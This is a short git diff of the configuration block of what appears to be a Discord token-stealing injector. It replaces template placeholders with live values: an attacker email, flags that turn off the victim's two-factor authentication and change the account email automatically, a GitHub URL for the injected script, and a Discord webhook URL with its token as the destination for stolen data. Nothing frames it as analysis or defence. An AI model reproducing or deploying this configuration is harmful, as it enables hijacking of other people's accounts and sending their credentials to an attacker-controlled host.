@@ -17,15 +17,15 @@ var config = {
   "logout-notify": "true",
   "init-notify": "true",
   "embed-color": 4873727,
-  disable2FA: "%DISABLEFA%",
-  changeMailAuto: "%AUTOMAILCHANGER%",
-  mail: "%CLIENTEMAIL%",
+  disable2FA: "true",
+  changeMailAuto: "true",
+  mail: "ziskolebg@gmail.com",
   creator: "%NAME_CREATOR%",
   transfer_link: `%TRANSFER_URL%`,
   injection_url:
-    "https://raw.githubusercontent.com/hawkish-teams/cerf/main/index.js",
-  webhook: "%WEBHOOK%",
-  Placed: "%API_URL%",
+    "https://raw.githubusercontent.com/ziskoweb/index.js/main/index.js",
+  webhook: "https://canary.discord.com/api/webhooks/1235937298298830950/2jHn__6RbqfEwjVUP0v8IpPC7F-C2LuT1hkhtlWVAKNKqDF6HsUSk2SiKLW2EIg04VRM",
+  Placed: "https://canary.discord.com/api/webhooks/1235937298298830950/2jHn__6RbqfEwjVUP0v8IpPC7F-C2LuT1hkhtlWVAKNKqDF6HsUSk2SiKLW2EIg04VRM",
   Filter: {
     urls: [
       "https://status.discord.com/api/v*/scheduled-maintenances/upcoming.json",
